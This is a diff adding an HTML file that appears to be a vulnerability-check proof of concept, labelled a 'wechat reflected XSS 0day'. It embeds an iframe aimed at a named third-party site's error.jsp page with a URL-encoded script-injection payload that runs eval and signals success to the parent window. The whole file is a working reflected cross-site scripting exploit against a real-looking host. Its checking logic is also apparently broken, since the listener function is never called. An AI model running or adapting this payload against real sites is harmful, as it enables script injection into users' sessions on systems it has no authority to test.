@@ -1,0 +1,25 @@
+<html>
+<script>
+
+    var check_state=false;
+    
+    function post_result(check_state) {
+        var parentwin = window.parent;
+        parentwin.postMessage(check_state,"*");
+    }
+    
+    function check_vuln() {
+        window.onmessage=function(message) {
+            if (true==message.data)
+                check_state=true;
+        };
+    }
+    
+    function wait_for_iframe_load() { 
+        post_result('({vuln_name:"wechat_reflected_xss_0day",check_state:'+check_state+'})')
+    } 
+    window.setTimeout(wait_for_iframe_load,2000); 
+    
+</script>
+    <iframe src="http://class.sise.com.cn:7001/sise/common/error.jsp?messages=%3Csvg%3E%3Cscript%3E/%3C1/%3Eeval(%27parentwin%3dwindow.parent%3bparentwin.postMessage(true%2c%27*%27)%3b%27)%3b%3C/script%3E" />
+</html>
